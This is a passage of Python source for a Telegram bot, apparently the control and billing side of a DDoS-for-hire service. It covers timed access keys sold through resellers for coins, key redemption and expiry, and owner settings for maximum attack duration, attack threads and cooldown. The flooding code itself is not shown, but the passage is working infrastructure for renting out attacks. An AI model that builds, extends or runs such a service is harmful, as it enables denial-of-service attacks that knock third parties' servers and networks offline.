        await update.message.reply_text("I don't understand that command. Please use the buttons or /start.", reply_markup=get_appropriate_markup(update))
    return ConversationHandler.END

async def set_group_image_prompt(update: Update, context: CallbackContext):
    """Prompt for setting a group-specific image."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can set group images!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        "🖼️ *Set Group Image*\n\n"
        "To set a welcome image for a *specific group*, reply to any message in that group with the image URL/photo.\n"
        "To set a *default image* for all groups (and private chat /start), send `default` followed by the image URL or a photo.\n\n"
        "*If sending URL:* `https://example.com/image.jpg [optional caption]`\n"
        "*If sending a photo:* Just send the photo with an optional caption.\n\n"
        "*(Note: Captions can use {owner_display_name} and {official_group_name} placeholders)*",
        parse_mode='Markdown'
    )
    # No specific state needed, handler will listen for PHOTO and TEXT
    return ConversationHandler.END # End conversation here, handle via general MessageHandlers

async def set_group_image_handler(update: Update, context: CallbackContext):
    """Handles the group image input (URL or photo)."""
    if not is_owner(update):
        return

    group_id_str = None
    target_chat_title = "all groups (default)"
    image_url = None
    caption_text = ""

    is_text_message = update.message.text
    is_photo_message = update.message.photo

    if is_text_message:
        text_parts = is_text_message.split(' ', 1)
        command_or_url = text_parts[0].strip().lower()

        if command_or_url == "default":
            if len(text_parts) > 1:
                content = text_parts[1].strip()
                if content.startswith('http://') or content.startswith('https://'):
                    parts_with_caption = content.split(' ', 1)
                    image_url = parts_with_caption[0]
                    if len(parts_with_caption) > 1:
                        caption_text = parts_with_caption[1]
                else:
                    await update.message.reply_text("❌ Invalid URL for default image. Must start with `http://` or `https://`.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
                    return
            group_id_str = 'default'
        else: # Assume it's a URL directly sent in a group or private chat
            image_url = command_or_url
            if len(text_parts) > 1:
                caption_text = text_parts[1].strip()
            
            if update.effective_chat.type in ['group', 'supergroup']:
                group_id_str = str(update.effective_chat.id)
                target_chat_title = update.effective_chat.title
            else: # If a URL is sent in private chat, and not "default", assume it's for default
                group_id_str = 'default'


    elif is_photo_message:
        image_url = update.message.photo[-1].file_id # Get the highest quality photo
        caption_text = update.message.caption if update.message.caption else ""
        if update.effective_chat.type in ['group', 'supergroup']:
            group_id_str = str(update.effective_chat.id)
            target_chat_title = update.effective_chat.title
        else:
            group_id_str = 'default' # For private chat, treat as default

    if not image_url:
        # This handler might catch general text/photos, so only respond if it's explicitly a command or for group image setting
        if is_text_message and is_text_message.lower().startswith('/set_group_image'):
            await update.message.reply_text(
                "❌ Invalid input. Please send an image URL (starting with `http://` or `https://`) or forward a photo for the group's welcome image.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
        return

    if not (image_url.startswith('http://') or image_url.startswith('https://')) and not image_url.startswith('AgAC'): # AgAC for file_id
        await update.message.reply_text(
            "❌ Invalid URL format! Must start with `http://` or `https://` for external links, or be a direct file ID.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        return

    if not group_id_str:
        await update.message.reply_text(
            "ℹ️ Could not determine the target. Please reply to a group message or use `default` to set the image.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        return

    GROUP_IMAGES[group_id_str] = {'url': image_url, 'caption': caption_text}
    save_image_config()

    await update.message.reply_text(
        f"✅ Welcome image for *{target_chat_title}* updated successfully!\n"
        f"URL: `{escape_markdown(image_url, version=2)}`\nCaption: `{escape_markdown(caption_text, version=2) if caption_text else 'None'}`",
        parse_mode='MarkdownV2',
        reply_markup=get_appropriate_markup(update)
    )

async def set_group_link_prompt(update: Update, context: CallbackContext):
    """Prompt for setting a group-specific invite link."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can set group links!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        "🔗 *Set Group Link*\n\n"
        "To set an invite link for a *specific group*, reply to any message in that group with the invite link.\n"
        "To set the *official group link* (used in /start captions), send `official` followed by the link.\n\n"
        "*Example:* `https://t.me/+AbCdefGHiJkLmNoPqrStUvWxYz`\n"
        "*(Note: Ensure it's a full invite link)*",
        parse_mode='Markdown'
    )
    return GET_GROUP_LINK # New state for group link

async def set_group_link_handler(update: Update, context: CallbackContext):
    """Handles the group link input."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can set group links!", parse_mode='Markdown')
        return ConversationHandler.END

    group_id_str = None
    target_chat_title = "Official Group Link"
    group_link = update.message.text.strip()

    if group_link.lower().startswith('official '):
        group_link = group_link[len('official '):].strip()
        group_id_str = 'official_group_link' # Special key for the official link
    elif update.message.reply_to_message and update.message.reply_to_message.chat.type in ['group', 'supergroup']:
        group_id_str = str(update.message.reply_to_message.chat.id)
        target_chat_title = update.message.reply_to_message.chat.title
    elif update.effective_chat.type in ['group', 'supergroup']:
        group_id_str = str(update.effective_chat.id)
        target_chat_title = update.effective_chat.title
    else: # If sent in private chat and not "official", then it's likely a mistake or for private link usage
        await update.message.reply_text(
            "❌ Please specify if this is for the `official` group link or reply to a group message.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        return ConversationHandler.END

    if not (group_link.startswith('http://') or group_link.startswith('https://') or group_link.startswith('t.me/')):
        await update.message.reply_text("❌ Invalid link format! Must be a valid URL or Telegram invite link.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    if group_id_str == 'official_group_link':
        global OFFICIAL_GROUP_NAME
        OFFICIAL_GROUP_NAME = group_link # Update the global variable for official link
        save_image_config() # Save the change to image_config.json
        await update.message.reply_text(
            f"✅ Official group link set to: `{escape_markdown(group_link, version=2)}`\n"
            "This link will now appear in /start captions.",
            parse_mode='MarkdownV2',
            reply_markup=get_appropriate_markup(update)
        )
    else:
        GROUP_IMAGES[group_id_str]['group_link'] = group_link # Store group specific link
        save_image_config() # Assuming group_images stores this too
        await update.message.reply_text(
            f"✅ Invite link for *{target_chat_title}* set to: `{escape_markdown(group_link, version=2)}`",
            parse_mode='MarkdownV2',
            reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def redeem_key(update: Update, context: CallbackContext):
    """Redeems a key provided by the user."""
    user_id = update.effective_user.id
    key = update.message.text.strip()
    
    if key in keys:
        expiration_time = keys[key]['expiration_time']
        generated_by = keys[key]['generated_by']
        
        # Check if the key has expired
        if expiration_time <= time.time():
            await update.message.reply_text("❌ This key has expired.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
            del keys[key]
            save_keys()
            return ConversationHandler.END
        
        # Check if the user already has an active key
        if user_id in redeemed_users:
            current_expiration = redeemed_users[user_id]
            is_special = isinstance(current_expiration, dict) and current_expiration.get('is_special', False)
            current_expiration_time_val = current_expiration['expiration_time'] if isinstance(current_expiration, dict) else current_expiration

            if current_expiration_time_val > time.time():
                remaining_time = int(current_expiration_time_val - time.time())
                days, rem = divmod(remaining_time, 86400)
                hours, rem = divmod(rem, 3600)
                minutes, seconds = divmod(rem, 60)
                
                await update.message.reply_text(
                    f"⚠️ You already have an active key for: *{days}d {hours}h {minutes}m {seconds}s*.\n"
                    "If you redeem a new key, your old key will be overwritten.",
                    parse_mode='Markdown'
                )
                
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("Redeem Anyway (Overwrite)", callback_data=f"redeem_overwrite:{key}")],
                    [InlineKeyboardButton("Cancel", callback_data="redeem_cancel")]
                ])
                await update.message.reply_text("Do you want to proceed?", reply_markup=keyboard)
                context.user_data['key_to_redeem'] = key
                context.user_data['key_generated_by'] = generated_by
                return ConversationHandler.END # Stay in conversation to wait for callback
            
        # If no active key or expired key, proceed with redemption
        redeemed_users[user_id] = expiration_time
        redeemed_keys_info[key] = {
            'generated_by': generated_by,
            'redeemed_by': user_id,
            'is_special': False
        }
        del keys[key] # Remove from active keys list
        save_keys()
        
        remaining_time = int(expiration_time - time.time())
        days, rem = divmod(remaining_time, 86400)
        hours, rem = divmod(rem, 3600)
        minutes, seconds = divmod(rem, 60)
        
        await update.message.reply_text(
            f"✅ Key redeemed successfully! Your access is valid for: *{days}d {hours}h {minutes}m {seconds}s*.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        logging.info(f"User {user_id} redeemed regular key '{key}' generated by {generated_by}.")
    
    elif key in special_keys:
        expiration_time = special_keys[key]['expiration_time']
        generated_by = special_keys[key]['generated_by']

        # Check if the key has expired
        if expiration_time <= time.time():
            await update.message.reply_text("❌ This special key has expired.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
            del special_keys[key]
            save_keys()
            return ConversationHandler.END

        # Check if the user already has an active key
        if user_id in redeemed_users:
            current_expiration = redeemed_users[user_id]
            is_special = isinstance(current_expiration, dict) and current_expiration.get('is_special', False)
            current_expiration_time_val = current_expiration['expiration_time'] if isinstance(current_expiration, dict) else current_expiration

            if current_expiration_time_val > time.time():
                remaining_time = int(current_expiration_time_val - time.time())
                days, rem = divmod(remaining_time, 86400)
                hours, rem = divmod(rem, 3600)
                minutes, seconds = divmod(rem, 60)
                
                await update.message.reply_text(
                    f"⚠️ You already have an active key for: *{days}d {hours}h {minutes}m {seconds}s* (Special: {is_special}).\n"
                    "If you redeem a new key, your old key will be overwritten. A special key will always overwrite a regular key.",
                    parse_mode='Markdown'
                )
                
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("Redeem Anyway (Overwrite)", callback_data=f"redeem_overwrite_special:{key}")],
                    [InlineKeyboardButton("Cancel", callback_data="redeem_cancel")]
                ])
                await update.message.reply_text("Do you want to proceed?", reply_markup=keyboard)
                context.user_data['key_to_redeem'] = key
                context.user_data['key_generated_by'] = generated_by
                context.user_data['is_special_key'] = True
                return ConversationHandler.END # Stay in conversation to wait for callback
        
        # If no active key or expired key, proceed with redemption
        redeemed_users[user_id] = {'expiration_time': expiration_time, 'is_special': True}
        redeemed_keys_info[key] = {
            'generated_by': generated_by,
            'redeemed_by': user_id,
            'is_special': True
        }
        del special_keys[key] # Remove from active special keys list
        save_keys()
        
        remaining_time = int(expiration_time - time.time())
        days, rem = divmod(remaining_time, 86400)
        hours, rem = divmod(rem, 3600)
        minutes, seconds = divmod(rem, 60)
        
        await update.message.reply_text(
            f"⚡️ Special Key redeemed successfully! Your access is valid for: *{days}d {hours}h {minutes}m {seconds}s*.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        logging.info(f"User {user_id} redeemed special key '{key}' generated by {generated_by}.")

    else:
        await update.message.reply_text("❌ Invalid or already redeemed key.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    
    return ConversationHandler.END

async def redeem_key_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "redeem_cancel":
        await query.edit_message_text("🚫 Key redemption cancelled.", reply_markup=None)
        await query.message.reply_markup(reply_markup=get_appropriate_markup(update))
        context.user_data.pop('key_to_redeem', None)
        context.user_data.pop('key_generated_by', None)
        context.user_data.pop('is_special_key', None)
        return ConversationHandler.END

    key = context.user_data.get('key_to_redeem')
    generated_by = context.user_data.get('key_generated_by')
    is_special_key_flag = context.user_data.get('is_special_key', False)

    if not key:
        await query.edit_message_text("❌ No key to redeem. Please start the redeem process again.", reply_markup=None)
        await query.message.reply_markup(reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END
    
    if query.data == f"redeem_overwrite:{key}" or query.data == f"redeem_overwrite_special:{key}":
        if is_special_key_flag:
            if key not in special_keys:
                await query.edit_message_text("❌ Special key not found or already redeemed by someone else.", reply_markup=None)
                await query.message.reply_markup(reply_markup=get_appropriate_markup(update))
                context.user_data.pop('key_to_redeem', None)
                context.user_data.pop('key_generated_by', None)
                context.user_data.pop('is_special_key', None)
                return ConversationHandler.END

            expiration_time = special_keys[key]['expiration_time']
            if expiration_time <= time.time():
                await query.edit_message_text("❌ This special key has expired during confirmation.", reply_markup=None)
                await query.message.reply_markup(reply_markup=get_appropriate_markup(update))
                del special_keys[key]
                save_keys()
                context.user_data.pop('key_to_redeem', None)
                context.user_data.pop('key_generated_by', None)
                context.user_data.pop('is_special_key', None)
                return ConversationHandler.END

            redeemed_users[user_id] = {'expiration_time': expiration_time, 'is_special': True}
            redeemed_keys_info[key] = {
                'generated_by': generated_by,
                'redeemed_by': user_id,
                'is_special': True
            }
            del special_keys[key]
            save_keys()
            
            remaining_time = int(expiration_time - time.time())
            days, rem = divmod(remaining_time, 86400)
            hours, rem = divmod(rem, 3600)
            minutes, seconds = divmod(rem, 60)
            
            await query.edit_message_text(
                f"⚡️ Special Key redeemed successfully (overwritten)! Your access is valid for: *{days}d {hours}h {minutes}m {seconds}s*.",
                parse_mode='Markdown', reply_markup=None
            )
            await query.message.reply_markup(reply_markup=get_appropriate_markup(update))
            logging.info(f"User {user_id} overwrote with special key '{key}' generated by {generated_by}.")

        else: # Regular key overwrite
            if key not in keys:
                await query.edit_message_text("❌ Key not found or already redeemed by someone else.", reply_markup=None)
                await query.message.reply_markup(reply_markup=get_appropriate_markup(update))
                context.user_data.pop('key_to_redeem', None)
                context.user_data.pop('key_generated_by', None)
                context.user_data.pop('is_special_key', None)
                return ConversationHandler.END

            expiration_time = keys[key]['expiration_time']
            if expiration_time <= time.time():
                await query.edit_message_text("❌ This key has expired during confirmation.", reply_markup=None)
                await query.message.reply_markup(reply_markup=get_appropriate_markup(update))
                del keys[key]
                save_keys()
                context.user_data.pop('key_to_redeem', None)
                context.user_data.pop('key_generated_by', None)
                context.user_data.pop('is_special_key', None)
                return ConversationHandler.END
                
            redeemed_users[user_id] = expiration_time
            redeemed_keys_info[key] = {
                'generated_by': generated_by,
                'redeemed_by': user_id,
                'is_special': False
            }
            del keys[key]
            save_keys()
            
            remaining_time = int(expiration_time - time.time())
            days, rem = divmod(remaining_time, 86400)
            hours, rem = divmod(rem, 3600)
            minutes, seconds = divmod(rem, 60)
            
            await query.edit_message_text(
                f"✅ Key redeemed successfully (overwritten)! Your access is valid for: *{days}d {hours}h {minutes}m {seconds}s*.",
                parse_mode='Markdown', reply_markup=None
            )
            await query.message.reply_markup(reply_markup=get_appropriate_markup(update))
            logging.info(f"User {user_id} overwrote with regular key '{key}' generated by {generated_by}.")
            
    context.user_data.pop('key_to_redeem', None)
    context.user_data.pop('key_generated_by', None)
    context.user_data.pop('is_special_key', None)
    return ConversationHandler.END

async def show_status(update: Update, context: CallbackContext):
    """Shows the user's key status."""
    user_id = update.effective_user.id
    if user_id in redeemed_users:
        user_redeem_data = redeemed_users[user_id]
        is_special = isinstance(user_redeem_data, dict) and user_redeem_data.get('is_special', False)
        expiration_time = user_redeem_data['expiration_time'] if isinstance(user_redeem_data, dict) else user_redeem_data

        if expiration_time > time.time():
            remaining_time = int(expiration_time - time.time())
            days, rem = divmod(remaining_time, 86400)
            hours, rem = divmod(rem, 3600)
            minutes, seconds = divmod(rem, 60)
            
            key_type_str = "Special Key" if is_special else "Regular Key"
            
            await update.message.reply_text(
                f"✅ Your *{key_type_str}* is active! Remaining time: *{days}d {hours}h {minutes}m {seconds}s*.",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Your key has expired.", parse_mode='Markdown')
            del redeemed_users[user_id]
            # No need to remove from redeemed_keys_info, it acts as a log
            save_keys()
    else:
        await update.message.reply_text("❌ You do not have an active key. Use 'Redeem Key' to get one.", parse_mode='Markdown')

async def check_expired_keys(context: CallbackContext):
    """Job queue function to check and remove expired keys."""
    global keys, special_keys, redeemed_users

    current_time = time.time()
    
    # Check regular keys
    expired_regular_keys = [key for key, info in keys.items() if info['expiration_time'] <= current_time]
    for key in expired_regular_keys:
        del keys[key]
        logging.info(f"Expired regular key removed: {key}")

    # Check special keys
    expired_special_keys = [key for key, info in special_keys.items() if info['expiration_time'] <= current_time]
    for key in expired_special_keys:
        del special_keys[key]
        logging.info(f"Expired special key removed: {key}")

    # Check redeemed users' keys
    expired_redeemed_users = []
    for user_id, data in redeemed_users.items():
        expiration_time = data['expiration_time'] if isinstance(data, dict) else data
        if expiration_time <= current_time:
            expired_redeemed_users.append(user_id)
    
    for user_id in expired_redeemed_users:
        del redeemed_users[user_id]
        logging.info(f"User {user_id}'s key expired and removed from active list.")
        # Optionally notify user if bot is running and they are reachable
        # try:
        #     await context.bot.send_message(chat_id=user_id, text="Your key has expired. Please redeem a new one.")
        # except Exception as e:
        #     logging.warning(f"Could not notify user {user_id} about expired key: {e}")

    if expired_regular_keys or expired_special_keys or expired_redeemed_users:
        save_keys()
        logging.info("Expired keys cleaned up and saved.")


async def generate_key_prompt(update: Update, context: CallbackContext):
    """Prompts for key generation duration."""
    if not (is_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ You are not authorized to generate keys.", parse_mode='Markdown')
        return ConversationHandler.END

    keyboard_buttons = [[d for d in KEY_PRICES.keys() if "H" in d or "D" in d and KEY_PRICES[d] >= 0]]
    reply_markup = ReplyKeyboardMarkup(keyboard_buttons + [['Cancel']], resize_keyboard=True, one_time_keyboard=True)

    await update.message.reply_text(
        "🔑 *Generate Regular Key*\n\n"
        "Select a duration for the key:",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )
    return GET_DURATION

async def generate_key(update: Update, context: CallbackContext):
    """Generates a regular key based on selected duration."""
    user_id = update.effective_user.id
    duration_str = update.message.text.strip().upper()

    if duration_str == 'CANCEL':
        await update.message.reply_text("🚫 Key generation cancelled.", reply_markup=get_appropriate_markup(update), parse_mode='Markdown')
        return ConversationHandler.END

    if duration_str not in KEY_PRICES:
        await update.message.reply_text(
            "❌ Invalid duration. Please choose from the provided options.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        return ConversationHandler.END

    price = KEY_PRICES[duration_str]
    if is_reseller(update):
        current_balance = reseller_balances.get(str(user_id), 0) # Ensure key is string
        if current_balance < price:
            await update.message.reply_text(
                f"❌ Insufficient balance! Your balance: *{current_balance}* coins. Price: *{price}* coins.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
            return ConversationHandler.END
        reseller_balances[str(user_id)] = current_balance - price # Deduct cost
        save_resellers()
        await update.message.reply_text(f"✅ Deducted *{price}* coins from your balance. Remaining balance: *{reseller_balances[str(user_id)]}*.", parse_mode='Markdown')

    # Calculate expiration time
    if 'H' in duration_str:
        hours = int(duration_str.replace('H', ''))
        expiration_time = time.time() + hours * 3600
    elif 'D' in duration_str:
        days = int(duration_str.replace('D', ''))
        expiration_time = time.time() + days * 86400

    new_key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))
    keys[new_key] = {
        'expiration_time': expiration_time,
        'generated_by': user_id
    }
    save_keys()

    await update.message.reply_text(
        f"🔑 Your new regular key (valid for *{duration_str}*):\n`{new_key}`",
        parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
    )
    logging.info(f"User {user_id} generated regular key '{new_key}' for {duration_str}.")
    return ConversationHandler.END

async def generate_special_key_prompt(update: Update, context: CallbackContext):
    """Prompts for special key generation duration."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can generate special keys.", parse_mode='Markdown')
        return ConversationHandler.END

    keyboard_buttons = [[d for d in SPECIAL_KEY_PRICES.keys() if "D" in d and SPECIAL_KEY_PRICES[d] >= 0]]
    reply_markup = ReplyKeyboardMarkup(keyboard_buttons + [['Cancel']], resize_keyboard=True, one_time_keyboard=True)

    await update.message.reply_text(
        "⚡️ *Generate Special Key*\n\n"
        "Select a duration for the special key:",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )
    return GET_SPECIAL_KEY_DURATION

async def generate_special_key(update: Update, context: CallbackContext):
    """Generates a special key based on selected duration."""
    user_id = update.effective_user.id
    duration_str = update.message.text.strip().upper()

    if duration_str == 'CANCEL':
        await update.message.reply_text("🚫 Special key generation cancelled.", reply_markup=get_appropriate_markup(update), parse_mode='Markdown')
        return ConversationHandler.END

    if duration_str not in SPECIAL_KEY_PRICES:
        await update.message.reply_text(
            "❌ Invalid duration. Please choose from the provided options.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        return ConversationHandler.END

    days = int(duration_str.replace('D', ''))
    expiration_time = time.time() + days * 86400

    new_key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))
    special_keys[new_key] = {
        'expiration_time': expiration_time,
        'generated_by': user_id
    }
    save_keys()

    await update.message.reply_text(
        f"⚡️ Your new special key (valid for *{duration_str}*):\n`{new_key}`",
        parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
    )
    logging.info(f"User {user_id} generated special key '{new_key}' for {duration_str}.")
    return ConversationHandler.END


async def delete_key_prompt(update: Update, context: CallbackContext):
    """Prompts for the key to delete."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can delete keys.", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ Enter the key you want to delete:")
    return GET_DELETE_KEY

async def delete_key(update: Update, context: CallbackContext):
    """Deletes a specified key."""
    key_to_delete = update.message.text.strip()
    if key_to_delete in keys:
        del keys[key_to_delete]
        await update.message.reply_text(
            f"✅ Regular key `{key_to_delete}` deleted successfully.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        save_keys()
        logging.info(f"Owner deleted regular key: {key_to_delete}")
    elif key_to_delete in special_keys:
        del special_keys[key_to_delete]
        await update.message.reply_text(
            f"✅ Special key `{key_to_delete}` deleted successfully.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        save_keys()
        logging.info(f"Owner deleted special key: {key_to_delete}")
    else:
        await update.message.reply_text("❌ Key not found in active regular or special keys.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    return ConversationHandler.END

async def settings_menu(update: Update, context: CallbackContext):
    """Shows the settings menu."""
    if not (is_owner(update) or is_reseller(update) or is_co_owner(update)):
        await update.message.reply_text("❌ You are not authorized to access settings.", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(
        "⚙️ *Settings Menu*\n\n"
        "Select an option to configure bot settings:",
        parse_mode='Markdown',
        reply_markup=settings_markup
    )

async def set_duration_prompt(update: Update, context: CallbackContext):
    """Prompts for new max attack duration."""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can set duration.", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(
        f"⏳ Current max duration: *{max_duration}* seconds.\n"
        "Enter new max duration in seconds (e.g., `300`):",
        parse_mode='Markdown'
    )
    return GET_SET_DURATION

async def set_duration(update: Update, context: CallbackContext):
    """Sets new max attack duration."""
    global max_duration
    try:
        new_duration = int(update.message.text.strip())
        if new_duration <= 0:
            raise ValueError
        max_duration = new_duration
        await update.message.reply_text(
            f"✅ Max duration updated to: *{max_duration}* seconds.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a positive integer for duration.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def set_threads_prompt(update: Update, context: CallbackContext):
    """Prompts for new max attack threads."""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can set threads.", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(
        f"🧵 Current max threads: *{MAX_THREADS}*.\n"
        "Enter new max threads (e.g., `1000`):",
        parse_mode='Markdown'
    )
    return GET_SET_THREADS

async def set_threads(update: Update, context: CallbackContext):
    """Sets new max attack threads."""
    global MAX_THREADS
    try:
        new_threads = int(update.message.text.strip())
        if new_threads <= 0:
            raise ValueError
        MAX_THREADS = new_threads
        await update.message.reply_text(
            f"✅ Max threads updated to: *{MAX_THREADS}*.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a positive integer for threads.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def set_cooldown_prompt(update: Update, context: CallbackContext):
    """Prompts for new global cooldown."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can set cooldown.", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(
        f"❄️ Current global cooldown: *{global_cooldown}* seconds.\n"
        "Enter new cooldown in seconds (e.g., `30`):",
        parse_mode='Markdown'
    )
    return GET_SET_COOLDOWN

async def set_cooldown(update: Update, context: CallbackContext):
    """Sets new global cooldown."""
    global global_cooldown
    try:
        new_cooldown = int(update.message.text.strip())
        if new_cooldown < 0:
            raise ValueError
        global_cooldown = new_cooldown
        await update.message.reply_text(
            f"✅ Global cooldown updated to: *{global_cooldown}* seconds.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a non-negative integer for cooldown.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def add_reseller_prompt(update: Update, context: CallbackContext):
    """Prompts for reseller user ID."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can add resellers.", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ Enter the user ID of the reseller to add:")
    return GET_RESELLER_ID

async def add_reseller(update: Update, context: CallbackContext):
    """Adds a reseller."""
    try:
        reseller_id = int(update.message.text.strip())
        if reseller_id in resellers:
            await update.message.reply_text("❌ This user is already a reseller.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        else:
            resellers.add(reseller_id)
            reseller_balances[str(reseller_id)] = 0 # Initialize balance
            save_resellers()
            await update.message.reply_text(
                f"✅ User ID `{reseller_id}` added as a reseller with 0 balance.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
            logging.info(f"Owner {update.effective_user.id} added reseller: {reseller_id}")
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a valid user ID (number).",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def remove_reseller_prompt(update: Update, context: CallbackContext):
    """Prompts for reseller user ID to remove."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can remove resellers.", parse_mode='Markdown')
        return ConversationHandler.END

    if not resellers:
        await update.message.reply_text("ℹ️ No resellers currently configured.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    reseller_list_str = "\n".join([f"• `{res_id}`" for res_id in resellers])
    await update.message.reply_text(
        f"⚠️ Current Resellers:\n{reseller_list_str}\n\nEnter the user ID of the reseller to remove:",
        parse_mode='Markdown'
    )
    return GET_REMOVE_RESELLER_ID

async def remove_reseller(update: Update, context: CallbackContext):
    """Removes a reseller."""
    try:
        reseller_id = int(update.message.text.strip())
        if reseller_id in resellers:
            resellers.remove(reseller_id)
            if str(reseller_id) in reseller_balances:
                del reseller_balances[str(reseller_id)]
            save_resellers()
            await update.message.reply_text(
                f"✅ User ID `{reseller_id}` removed from resellers.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
            logging.info(f"Owner {update.effective_user.id} removed reseller: {reseller_id}")
        else:
            await update.message.reply_text("❌ This user is not a reseller.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a valid user ID (number).",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def add_coin_prompt(update: Update, context: CallbackContext):
    """Prompts for user ID to add coins to."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can add coins.", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ Enter the user ID to add coins to:")
    return GET_ADD_COIN_USER_ID

async def add_coin_user_id(update: Update, context: CallbackContext):
    """Receives user ID for adding coins."""
    try:
        user_id_to_add = int(update.message.text.strip())
        if user_id_to_add not in resellers and user_id_to_add != OWNER_ID:
            await update.message.reply_text(
                "❌ You can only add coins to resellers or yourself (owner).",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
            return ConversationHandler.END
        
        context.user_data['target_user_id_for_coins'] = user_id_to_add
        await update.message.reply_text(
            f"⚠️ How many coins to add to user ID `{user_id_to_add}`?",
            parse_mode='Markdown'
        )
        return GET_ADD_COIN_AMOUNT
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a valid user ID (number).",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def add_coin_amount(update: Update, context: CallbackContext):
    """Adds coins to specified user ID."""
    try:
        amount = int(update.message.text.strip())
        if amount <= 0:
            raise ValueError
        
        target_user_id = context.user_data.pop('target_user_id_for_coins')
        
        # If adding to owner's balance
        if target_user_id == OWNER_ID:
            # Assuming owner's balance is part of reseller_balances for simplicity, or manage separately
            reseller_balances[str(OWNER_ID)] = reseller_balances.get(str(OWNER_ID), 0) + amount
            await update.message.reply_text(
                f"✅ Added *{amount}* coins to Owner's balance. New balance: *{reseller_balances[str(OWNER_ID)]}*.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
        elif target_user_id in resellers:
            reseller_balances[str(target_user_id)] = reseller_balances.get(str(target_user_id), 0) + amount
            save_resellers()
            await update.message.reply_text(
                f"✅ Added *{amount}* coins to reseller ID `{target_user_id}`. New balance: *{reseller_balances[str(target_user_id)]}*.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
        else:
            await update.message.reply_text(
                "❌ Target user is not a reseller or owner. Coins not added.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
        logging.info(f"Owner {update.effective_user.id} added {amount} coins to user {target_user_id}")

    except ValueError:
        await update.message.reply_text(
